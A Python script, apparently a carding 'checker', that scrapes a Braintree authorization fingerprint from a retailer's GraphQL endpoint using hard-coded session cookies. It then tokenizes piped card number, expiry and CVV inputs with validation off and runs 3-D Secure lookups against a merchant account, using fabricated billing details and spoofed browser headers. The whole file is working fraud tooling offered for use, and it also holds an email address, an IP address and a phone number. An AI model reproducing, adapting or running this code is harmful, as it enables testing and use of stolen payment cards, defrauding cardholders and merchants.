import base64
import json
import requests
import os
import time
from user_agent import  generate_user_agent

us = generate_user_agent()

def GITVPB():
    try:
        cookies = {
    'UUID': '75d0f2-b1e-bd6-e0fd-543610c2a372',
    'ConstructorioID_client_id': '654547b9-8aad-48c5-80cb-0c66a50e7091',
    '_gcl_au': '1.1.176934448.1726760111',
    '_ga': 'GA1.1.1399024328.1726760106',
    'gtmNamespaceDeclared': 'true',
    '_pin_unauth': 'dWlkPVpXWmtPVE5rT0RZdFltUTFNQzAwT0ROakxXSm1PRE10TnprMVpEUmhabUUzT0RreQ',
    'BVBRANDID': '4399a35c-570f-49b0-9d2b-666ca19b06b8',
    'sa-user-id': 's%253A0-3dfc25a9-e73a-4ebf-6d98-4352b463ff69.kqdPPtfQ58voV6HqogyS2Fwkdwf%252FiiL1BpOBVoJJDGU',
    'sa-user-id-v2': 's%253APfwlqec6Tr9tmENStGP_aWgcw0s.%252FvjR1e7ZVKmRYSRkeG8%252FVUwT7a%252BYW6dRlPh3EajPZrE',
    'sa-user-id-v3': 's%253AAQAKIMfM4u2L0z2SSs5yaMaBEChgmKod99t_-8jQXRCIJnDBEKAEGAIgyu2htgY6BC27IaxCBJ6SuM0.VYVXgn3RfGtxvQxv%252B47HtrjnGcE9dfZpwxK9%252BFA0BUY',
    '_fbp': 'fb.1.1726760116946.82814176530814073',
    '_tt_enable_cookie': '1',
    '_ttp': 'YBt-J5YhcYcBJw8L8eY_zOIHkNv',
    '_cs_c': '0',
    'GSIDUrNuC2c0oQie': '916c4fc7-729e-405b-8179-98c1441432f2',
    'STSID555606': 'cce52bad-78f3-4e3f-96a6-6f5e2d215bd5',
    '__attentive_id': 'e818db812189442fbdfb4da81178050a',
    '_attn_': 'eyJ1Ijoie1wiY29cIjoxNzI2NzYwMTE4Mjg1LFwidW9cIjoxNzI2NzYwMTE4Mjg1LFwibWFcIjoyMTkwMCxcImluXCI6ZmFsc2UsXCJ2YWxcIjpcImU4MThkYjgxMjE4OTQ0MmZiZGZiNGRhODExNzgwNTBhXCJ9In0=',
    '__attentive_cco': '1726760118296',
    '_y2': '1%3AeyJjIjp7fX0%3D%3AMTc0OTg2MjMwNA%3D%3D%3A99',
    '__zlcmid': '1Npn23bfDHOhjOs',
    'ltk-subscribed': 'Checkout',
    '__attentive_dv': '1',
    'regional-preference-url': '%7B%22value%22%3A%22https%3A%2F%2Fus.elemis.com%22%7D',
    'PHPSESSID': '8c604002af20618a6af54b1ba3cafc07',
    'returningVisitor': '6',
    'ABTasty': 'uid=021mnwwktz1j8bvk&fst=1726760102878&pst=1726910206070&cst=1726980633563&ns=4&pvt=20&pvis=2&th=1274060.1579276.11.5.2.1.1726760129280.1726910272870.0.3_1278331.1584810.6.2.2.1.1726760106352.1726980649809.0.4_1279709.1613675.17.2.3.1.1726760104729.1726980649799.0.4_1291811.0.11.5.2.1.1726760128649.1726910272185.0.3_1295187.1605359.2.1.2.1.1726760104813.1726980634404.0.4_1304970.1617271.1.1.1.1.1726980650564.1726980650564.0.4',
    'OptanonConsent': 'isGpcEnabled=0&datestamp=Sun+Sep+22+2024+07%3A50%3A51+GMT%2B0300+(%D8%A7%D9%84%D8%AA%D9%88%D9%82%D9%8A%D8%AA+%D8%A7%D9%84%D8%B9%D8%B1%D8%A8%D9%8A+%D8%A7%D9%84%D8%B1%D8%B3%D9%85%D9%8A)&version=202405.1.0&browserGpcFlag=0&isIABGlobal=false&hosts=&consentId=d27edc1d-9bcc-438e-bb78-85fda14dfca8&interactionCount=1&isAnonUser=1&landingPath=NotLandingPage&AwaitingReconsent=false&groups=C0001%3A1%2CC0003%3A1%2CSPD_BG%3A1%2CC0005%3A1%2CC0002%3A1%2CC0004%3A1',
    'cto_bundle': 'zURjCV9zb0hURGFsOThVTHpweG9oSGlBV0dLeDlzYklXMEF0Q0lCSnBkT3J6cDFPZmRDNWlqRjR5bHJRaEVqJTJCUlltTjBpNVZ2WTE5JTJGVjNmcEt5MWo4S3RRdXF0dUZFOWRJSm8xWlFReFRibW5pTWVqRHpZc1c1MDJPMHBBYWFreEI0dFBRd05adTduek9Vb1M4dlAlMkJUNHpPT3clM0QlM0Q',
    '_uetsid': '3f0b568077fa11ef83d0454cde78fcf2',
    '_uetvid': 'c534e630769c11ef9f16d979ca7584c8',
    'BVBRANDSID': '09f69b1d-5707-4dfa-b560-0db5cca3c576',
    'ltkpopup-session-depth': '1-50',
    'ltkSubscriber-Newsletter': 'eyJsdGtDaGFubmVsIjoiZW1haWwiLCJsdGtUcmlnZ2VyIjoibG9hZCIsImx0a0VtYWlsIjoiIiwibHRrT3B0SW4iOiJvZmYifQ%3D%3D',
    '__attentive_utm_loggedIn': 'false',
    '__attentive_pv': '1',
    '__attentive_ss_referrer': 'https://us.elemis.com/',
    '_cs_id': 'cd1cdfd3-f06a-ade8-b65f-64296d6c8ffe.1726760117.3.1726980663.1726980653.1724143178.1760924117809.1',
    '_cs_s': '4.0.0.1726982463891',
    'private_content_version': 'fbb656ab445ef58e76f233f696caf525',
    '_ga_GZKSYFV883': 'GS1.1.1726980636.3.1.1726980667.32.0.0',
    '_yi': '1%3AeyJsaSI6eyJjIjowLCJjb2wiOjM0NDUwMTMxMzgsImNwZyI6MTk5NTA1LCJjcGkiOjEwNjc5NTQwNzM3OCwic2MiOjMsInRzIjoxNzI2OTgwNjU1NzMyfSwic2UiOnsiYyI6MywiZWMiOjQ2LCJsYSI6MTcyNjk4MDY3NDE4MiwicCI6MSwic2MiOjIwfSwidSI6eyJpZCI6ImI1MmUzMTdhLTI1MjUtNGU5My05MTNkLWQ5NWQ0ZGE0ZDFkYiIsImZsIjoiMCJ9fQ%3D%3D%3ALTE5NjU3ODQwMA%3D%3D%3A99',
    'ABTastySession': 'mrasn=&lp=https%253A%252F%252Fus.elemis.com%252F',
}

        headers = {
    'authority': 'hakko.co.uk',
    'accept': '*/*',
    'accept-language': 'ar-TN,ar-EG;q=0.9,ar;q=0.8,en-US;q=0.7,en;q=0.6',
    'authorization': '',
    'content-currency': 'USD',
    'content-type': 'application/json',
    'origin': 'https://hakko.co.uk',
    'referer': 'https://hakko.co.uk/checkout',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'store': 'us',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

        json_data = {
            'operationName': None,
            'variables': {},
            'query': 'mutation{createBraintreeClientToken}',
        }

        res = requests.post('https://us.elemis.com/graphql', cookies=cookies, headers=headers, json=json_data)
        key = res.json()["data"]["createBraintreeClientToken"]
        dec = base64.b64decode(key)
        clint = dec.decode('utf-8')
        Auth = json.loads(clint)
        fixed = Auth['authorizationFingerprint']
        
        try:
            os.remove('VPV.txt')
        except:
            pass

        with open('VPV.txt', 'a') as t:
            t.write(f"{fixed}\n")

    except Exception as e:
        print(e)
        GITVPB()
        

#ركب البوابه جديده هنا 🟢      
def Payment(P):
    try:
        n, mm, yy, cvc = map(str.strip, P.split("|"))
        if not yy.startswith('20'):
           yy = '20' + yy
        try:
            with open("VPV.txt", "r") as f:
            	for line in f:
                    Auth = line.strip()
        except:
            GITVPB()
            with open("VPV.txt", "r") as f:
            	for line in f:
                    Auth = line.strip()

        hd = {
    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'ar-TN,ar-EG;q=0.9,ar;q=0.8,en-US;q=0.7,en;q=0.6',
    'authorization': f'Bearer {Auth}',
    'braintree-version': '2018-05-10',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'pragma': 'no-cache',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

        da = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': '4e4b04f5-94f1-4ad1-af28-940f2adedb7f',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': n,
                'expirationMonth': mm,
                'expirationYear': yy,
                'cvv': cvc,
                'billingAddress': {
                    'postalCode': 'EC1Y 8SY',
                    'streetAddress': 'New York, NY 10080, USA',
                },
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}

        req = requests.post('https://payments.braintree-api.com/graphql', headers=hd, json=da)
        tok = req.json()['data']['tokenizeCreditCard']['token']

        headers = {
    'authority': 'api.braintreegateway.com',
    'accept': '*/*',
    'accept-language': 'ar-TN,ar-EG;q=0.9,ar;q=0.8,en-US;q=0.7,en;q=0.6',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'origin': 'https://hakko.co.uk',
    'pragma': 'no-cache',
    'referer': 'https://hakko.co.uk/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

        json_data = {
    'amount': '689.50',
    'browserColorDepth': 24,
    'browserJavaEnabled': False,
    'browserJavascriptEnabled': True,
    'browserLanguage': 'ar-TN',
    'browserScreenHeight': 806,
    'browserScreenWidth': 360,
    'browserTimeZone': -180,
    'deviceChannel': 'Browser',
    'additionalInfo': {
        'shippingGivenName': 'ali',
        'shippingSurname': 'ali',
        'ipAddress': '185.195.59.221',
        'billingLine1': 'New York, NY 10080, USA',
        'billingLine2': '',
        'billingCity': 'New York',
        'billingState': '',
        'billingPostalCode': 'EC1Y 8SY',
        'billingCountryCode': 'GB',
        'billingPhoneNumber': '2096325145',
        'billingGivenName': 'ali',
        'billingSurname': 'ali',
        'shippingLine1': 'New York, NY 10080, USA',
        'shippingLine2': '',
        'shippingCity': 'New York',
        'shippingState': '',
        'shippingPostalCode': 'EC1Y 8SY',
        'shippingCountryCode': 'GB',
        'email': 'hmdhmadh585@gmail.com',
    },
    'challengeRequested': True,
    'bin': n[:6],
    'dfReferenceId': '0_f5abfe57-5947-4abc-9c2e-027773ebf10a',
    'clientMetadata': {
        'requestedThreeDSecureVersion': '2',
        'sdkVersion': 'web/3.106.0',
        'cardinalDeviceDataCollectionTimeElapsed': 5,
        'issuerDeviceDataCollectionTimeElapsed': 11856,
        'issuerDeviceDataCollectionResult': False,
    },
    'authorizationFingerprint': Auth,
    'braintreeLibraryVersion': 'braintree/web/3.106.0',
    '_meta': {
        'merchantAppId': 'hakko.co.uk',
        'platform': 'web',
        'sdkVersion': '3.106.0',
        'source': 'client',
        'integration': 'custom',
        'integrationType': 'custom',
        'sessionId': '4e4b04f5-94f1-4ad1-af28-940f2adedb7f',
    },
}

        res = requests.post(
            f'https://api.braintreegateway.com/merchants/24bgzphxpz9nrhbw/client_api/v1/payment_methods/{tok}/three_d_secure/lookup',
            headers=headers,
            json=json_data,
        )
        
        time.sleep(10)
        
        if 'Authorization fingerprint has an invalid format' in res.text or 'Authorization fingerprint is invalid' in res.text:
            msg = "Something Wrong Please Return Your Card Again"
            print(msg)
            GITVPB()
        else:
            try:
                return res.text
            except:
                return {"error": "Response content is not in JSON format", "details": res.text}

    except Exception as e:
        return {"error": str(e)}
    	
        